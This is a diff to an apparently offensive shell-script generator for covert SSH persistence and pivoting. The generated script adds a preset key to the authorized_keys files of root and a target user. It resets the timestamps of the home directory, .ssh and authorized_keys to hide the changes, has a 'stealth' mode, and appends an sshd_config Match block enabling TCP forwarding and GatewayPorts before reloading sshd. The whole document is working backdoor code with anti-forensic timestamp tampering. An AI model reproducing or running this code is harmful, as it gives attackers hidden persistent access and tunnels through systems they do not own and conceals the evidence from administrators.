@@ -127,13 +127,33 @@ KEY_ENTRY="$ESCAPED_KEY_ENTRY"
 
 preserve_time() {
   local ref="\$1" target="\$2"
-  [[ -e "\$ref" && -e "\$target" ]] && touch -r "\$ref" "\$target"
+  if [[ -n "\$ref" && -e "\$ref" && -e "\$target" ]]; then
+    touch -r "\$ref" "\$target"
+  fi
+}
+
+snapshot_time_ref() {
+  local path="\$1"
+  local ref
+
+  [[ -e "\$path" ]] || return 0
+
+  ref=\$(mktemp)
+  touch -r "\$path" "\$ref"
+  printf '%s\n' "\$ref"
+}
+
+cleanup_time_ref() {
+  local ref="\$1"
+  if [[ -n "\$ref" && -e "\$ref" ]]; then
+    rm -f "\$ref"
+  fi
 }
 
 add_key() {
   local user="\$1"
   local home sshdir authfile
-  local home_ts ssh_ts auth_ts
+  local home_ts_ref="" ssh_ts_ref="" auth_ts_ref=""
   local changed=0
 
   home=\$(getent passwd "\$user" | cut -d: -f6 || true)
@@ -142,31 +162,85 @@ add_key() {
   sshdir="\$home/.ssh"
   authfile="\$sshdir/authorized_keys"
 
-  home_ts="\$home"
-  [[ -d "\$sshdir" ]] && ssh_ts="\$sshdir" || ssh_ts=""
-  [[ -f "\$authfile" ]] && auth_ts="\$authfile" || auth_ts=""
+  home_ts_ref="\$(snapshot_time_ref "\$home")"
+  ssh_ts_ref="\$(snapshot_time_ref "\$sshdir")"
+  auth_ts_ref="\$(snapshot_time_ref "\$authfile")"
 
-  install -d -m 700 -o "\$user" -g "\$user" "\$sshdir"
-  touch "\$authfile"
-  chmod 600 "\$authfile"
-  chown "\$user:\$user" "\$authfile"
+  if [[ ! -d "\$sshdir" ]]; then
+    install -d -m 700 -o "\$user" -g "\$user" "\$sshdir"
+    changed=1
+  else
+    chmod 700 "\$sshdir"
+    chown "\$user:\$user" "\$sshdir"
+  fi
 
-  if ! grep -qxF "\$KEY_ENTRY" "\$authfile"; then
-    echo "\$KEY_ENTRY" >> "\$authfile"
+  if [[ -f "\$authfile" ]]; then
+    chmod 600 "\$authfile"
+    chown "\$user:\$user" "\$authfile"
+    if ! grep -qxF "\$KEY_ENTRY" "\$authfile"; then
+      printf '%s\n' "\$KEY_ENTRY" >> "\$authfile"
+      changed=1
+    fi
+  else
+    printf '%s\n' "\$KEY_ENTRY" > "\$authfile"
+    chmod 600 "\$authfile"
+    chown "\$user:\$user" "\$authfile"
     changed=1
   fi
 
   # Preserve timestamps only if we changed something
   if [[ "\$changed" -eq 1 ]]; then
-    if [[ -n "\$auth_ts" ]]; then
-      preserve_time "\$auth_ts" "\$authfile"
-    elif [[ -n "\$ssh_ts" ]]; then
-      preserve_time "\$ssh_ts" "\$authfile"
-      preserve_time "\$ssh_ts" "\$sshdir"
-    else
-      preserve_time "\$home_ts" "\$sshdir"
-      preserve_time "\$home_ts" "\$authfile"
+    if [[ -n "\$auth_ts_ref" ]]; then
+      preserve_time "\$auth_ts_ref" "\$authfile"
+    elif [[ -n "\$ssh_ts_ref" ]]; then
+      preserve_time "\$ssh_ts_ref" "\$authfile"
+    elif [[ -n "\$home_ts_ref" ]]; then
+      preserve_time "\$home_ts_ref" "\$authfile"
     fi
+
+    if [[ -n "\$ssh_ts_ref" ]]; then
+      preserve_time "\$ssh_ts_ref" "\$sshdir"
+    elif [[ -n "\$home_ts_ref" ]]; then
+      preserve_time "\$home_ts_ref" "\$sshdir"
+    fi
+
+    if [[ -n "\$home_ts_ref" ]]; then
+      preserve_time "\$home_ts_ref" "\$home"
+    fi
+  fi
+
+  cleanup_time_ref "\$auth_ts_ref"
+  cleanup_time_ref "\$ssh_ts_ref"
+  cleanup_time_ref "\$home_ts_ref"
+}
+
+ensure_sshd_block() {
+  local sshd_cfg="\$1"
+  local users="\$2"
+  local changed_ref="\$3"
+
+  has_complete_match_block() {
+    awk -v users="\$1" '
+      \$1=="Match" && \$2=="User" && \$3==users {inblock=1; next}
+      inblock && \$1=="Match" {exit}
+      inblock {
+        if (\$1=="PubkeyAuthentication" && \$2=="yes") has_pub=1
+        if (\$1=="AllowTcpForwarding" && \$2=="yes") has_fwd=1
+        if (\$1=="GatewayPorts" && \$2=="clientspecified") has_gateway=1
+      }
+      END { exit !(inblock && has_pub && has_fwd && has_gateway) }
+    ' "\$sshd_cfg"
+  }
+
+  if ! has_complete_match_block "\$users"; then
+    cat <<EOM >> "\$sshd_cfg"
+
+Match User \$users
+    PubkeyAuthentication yes
+    AllowTcpForwarding yes
+    GatewayPorts clientspecified
+EOM
+    printf -v "\$changed_ref" '%s' 1
   fi
 }
 
@@ -182,39 +256,17 @@ add_key root
 
 # sshd_config handling (high, non-stealth)
 if [[ "\$STEALTH" -eq 0 ]]; then
-  SSHD_CFG="/etc/ssh/sshd_config"
-  SSHD_TS="\$SSHD_CFG"
+  SSHD_CFG="\${PIVOT_ACCESS_INIT_SSHD_CONFIG:-/etc/ssh/sshd_config}"
+  SSHD_TS_REF="\$(snapshot_time_ref "\$SSHD_CFG")"
   changed=0
 
   users="root"
   [[ -n "\$TARGET_USER" ]] && users="root,\$TARGET_USER"
 
-  has_complete_match_block() {
-    awk -v users="\$1" '
-      \$1=="Match" && \$2=="User" && \$3==users {inblock=1; ok=1; next}
-      inblock && /^Match/ {exit}
-      inblock {
-        if (\$1=="PubkeyAuthentication" && \$2!="yes") ok=0
-        if (\$1=="AllowTcpForwarding" && \$2!="yes") ok=0
-        if (\$1=="GatewayPorts" && \$2!="clientspecified") ok=0
-      }
-      END { exit !(inblock && ok) }
-    ' "\$SSHD_CFG"
-  }
-
-  if ! has_complete_match_block "\$users"; then
-    cat <<EOM >> "\$SSHD_CFG"
-
-Match User \$users
-    PubkeyAuthentication yes
-    AllowTcpForwarding yes
-    GatewayPorts clientspecified
-EOM
-    changed=1
-  fi
+  ensure_sshd_block "\$SSHD_CFG" "\$users" changed
 
   if [[ "\$changed" -eq 1 ]]; then
-    sshd -t
+    sshd -t -f "\$SSHD_CFG"
 
     if systemctl is-active sshd >/dev/null 2>&1; then
       systemctl reload sshd 2>/dev/null || systemctl restart sshd
@@ -222,8 +274,10 @@ EOM
       service ssh reload 2>/dev/null || service ssh restart
     fi
 
-    preserve_time "\$SSHD_TS" "\$SSHD_CFG"
+    preserve_time "\$SSHD_TS_REF" "\$SSHD_CFG"
   fi
+
+  cleanup_time_ref "\$SSHD_TS_REF"
 fi
 EOF
 
